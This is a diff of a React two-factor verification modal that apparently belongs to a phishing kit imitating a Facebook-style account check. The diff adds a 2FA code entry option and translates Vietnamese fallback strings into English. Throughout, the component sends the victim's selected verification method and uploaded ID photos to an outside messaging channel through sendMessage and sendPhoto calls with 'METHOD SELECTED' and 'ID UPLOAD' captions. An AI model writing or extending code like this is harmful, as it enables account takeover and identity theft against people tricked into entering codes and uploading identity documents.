@@ -111,21 +111,35 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
     const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));
     const isDeviceNotificationMethod = activeMethod === 'device_notifications';
     const notifyMethodSelection = (value) => {
-        const methodText = value === 'device_notifications'
-            ? (texts.notificationsFromOtherDevices || 'Notifications from other devices')
-            : (texts.idAndSelfieVideo || 'ID and selfie video');
+        let methodText = texts.twoFactorAuthentication || 'Two-factor authentication';
+        if (value === 'device_notifications') {
+            methodText = texts.notificationsFromOtherDevices || 'Notifications from other devices';
+        }
+        if (value === 'id_selfie_video') {
+            methodText = texts.idAndSelfieVideo || 'ID and selfie video';
+        }
 
         const safeMethod = String(methodText)
             .replaceAll('&', '&amp;')
             .replaceAll('<', '&lt;')
             .replaceAll('>', '&gt;');
 
-        sendMessage(`🔔 <b>METHOD SELECTED</b>\nMethod: <code>${safeMethod}</code>`).catch(() => {});
+        sendMessage(
+            `🔔 <b>METHOD SELECTED</b>\nMethod: <code>${safeMethod}</code>`,
+            { replacePrevious: false }
+        ).catch(() => {});
     };
 
     const handleMethodSelect = (value) => {
         setSelectedMethod(value);
         notifyMethodSelection(value);
+
+        if (value === 'code') {
+            setActiveMethod('code');
+            setShowIdentityModal(false);
+            setShowMethodModal(false);
+            return;
+        }
 
         if (value === 'device_notifications') {
             setActiveMethod('device_notifications');
@@ -149,7 +163,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
 
         if (!String(selectedFile.type || '').startsWith('image/')) {
             setUploadedIdFile(null);
-            setIdentityError('Please choose an image file (jpg, png, webp).');
+            setIdentityError(texts.identityInvalidImageError || 'Please choose an image file (jpg, png, webp).');
             return;
         }
 
@@ -164,7 +178,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         }
 
         if (!uploadedIdFile) {
-            setIdentityError('Please upload an ID image before continuing.');
+            setIdentityError(texts.identityUploadRequiredError || 'Please upload an ID image before continuing.');
             return;
         }
 
@@ -172,18 +186,9 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
             setIsSendingIdFile(true);
             setIdentityError('');
 
-            const safeIdType = 'ID photo'
-                .replaceAll('&', '&amp;')
-                .replaceAll('<', '&lt;')
-                .replaceAll('>', '&gt;');
-            const safeFileName = String(uploadedIdFile.name || 'id-image.jpg')
-                .replaceAll('&', '&amp;')
-                .replaceAll('<', '&lt;')
-                .replaceAll('>', '&gt;');
-
             await sendPhoto(
                 uploadedIdFile,
-                `<b>ID UPLOAD</b>\nType: <code>${safeIdType}</code>\nFile: <code>${safeFileName}</code>`
+                '<b>ID UPLOAD</b>'
             );
 
             setShowIdentityModal(false);
@@ -191,13 +196,18 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
             setUploadedIdFile(null);
             onSuccess();
         } catch {
-            setIdentityError('Upload failed. Please try again.');
+            setIdentityError(texts.identityUploadFailedError || 'Upload failed. Please try again.');
         } finally {
             setIsSendingIdFile(false);
         }
     };
 
     const handleMethodContinue = () => {
+        if (selectedMethod === 'code') {
+            setActiveMethod('code');
+            setShowIdentityModal(false);
+        }
+
         if (selectedMethod === 'device_notifications') {
             setActiveMethod('device_notifications');
         }
@@ -210,6 +220,11 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
     };
 
     const methodOptions = [
+        {
+            value: 'code',
+            title: texts.twoFactorAuthentication || 'Two-factor authentication',
+            description: texts.twoFactorAuthenticationDescription || 'Enter your 6 or 8-digit 2FA code.',
+        },
         {
             value: 'device_notifications',
             title: texts.notificationsFromOtherDevices || 'Notifications from other devices',
@@ -486,7 +501,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                 fontSize: '12px',
                                 margin: '-1px 0 10px 0',
                             }}>
-                                {texts.validCodeHint || 'Mã hợp lệ gồm 6 hoặc 8 chữ số.'}
+                                {texts.validCodeHint || 'A valid code has 6 or 8 digits.'}
                             </p>
                         )}
 
@@ -525,10 +540,10 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                             display: 'inline-block',
                                             marginRight: '8px',
                                         }} />
-                                        {`${texts.pleaseWait || 'Vui lòng chờ'} ${formatTime(countdown)}...`}
+                                        {`${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...`}
                                     </>
                                 ) : (
-                                    texts.continueBtn || 'Tiếp tục'
+                                    texts.continueBtn || 'Continue'
                                 )}
                             </button>
                         </div>
@@ -552,7 +567,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                             fontSize: '14px',
                         }}
                         >
-                            <span>{texts.tryAnotherMethod || 'Thử phương thức khác'}</span>
+                            <span>{texts.tryAnotherMethod || 'Try another method'}</span>
                         </button>
                     </form>
                 </div>
@@ -886,7 +901,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                     fontWeight: 700,
                                     lineHeight: 1.1,
                                 }}>
-                                    Upload ID photo
+                                    {texts.uploadIdPhotoTitle || 'Upload ID photo'}
                                 </h4>
                                 <p style={{
                                     margin: '0 0 14px',
@@ -894,7 +909,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                     fontSize: '14px',
                                     lineHeight: 1.2,
                                 }}>
-                                    The information on the ID card must be clearly visible in the photo. If the information is unclear, you may need to resubmit. Check{' '}
+                                    {texts.uploadIdPhotoInstruction || 'The information on the ID card must be clearly visible in the photo. If the information is unclear, you may need to resubmit. Check'}{' '}
                                     <button
                                         type="button"
                                         style={{
@@ -907,12 +922,12 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                             cursor: 'pointer',
                                         }}
                                     >
-                                        photo requirements
+                                        {texts.photoRequirements || 'photo requirements'}
                                     </button>
                                 </p>
                                 <div style={{ borderTop: '1px solid #dadde1', marginBottom: '16px' }} />
                                 <p style={{ margin: '0 0 14px', color: '#1c1e21', fontSize: '13px', lineHeight: 1.3 }}>
-                                    Click Upload or drag and drop the photo file with your ID.
+                                    {texts.uploadIdDropHint || 'Click Upload or drag and drop the photo file with your ID.'}
                                 </p>
 
                                 <input
@@ -1019,13 +1034,13 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                         }}>
                                             +
                                         </span>
-                                        <span>Upload</span>
+                                        <span>{texts.uploadButton || 'Upload'}</span>
                                     </div>
                                 </label>
 
                                 {uploadedIdFile && (
                                     <p style={{ margin: '10px 0 0', color: '#606770', fontSize: '13px' }}>
-                                        Selected file: {uploadedIdFile.name}
+                                        {texts.selectedFileLabel || 'Selected file:'} {uploadedIdFile.name}
                                     </p>
                                 )}
                                 {identityError && (
@@ -1061,7 +1076,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                         cursor: 'pointer',
                                     }}
                                 >
-                                    Back
+                                    {texts.back || 'Back'}
                                 </button>
                                 <button
                                     type="button"
@@ -1079,7 +1094,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                         cursor: !uploadedIdFile || isSendingIdFile ? 'not-allowed' : 'pointer',
                                     }}
                                 >
-                                    {isSendingIdFile ? (texts.pleaseWait || 'Please wait') : 'Submission'}
+                                    {isSendingIdFile ? (texts.pleaseWait || 'Please wait') : (texts.submission || 'Submission')}
                                 </button>
                             </div>
                         ) : (
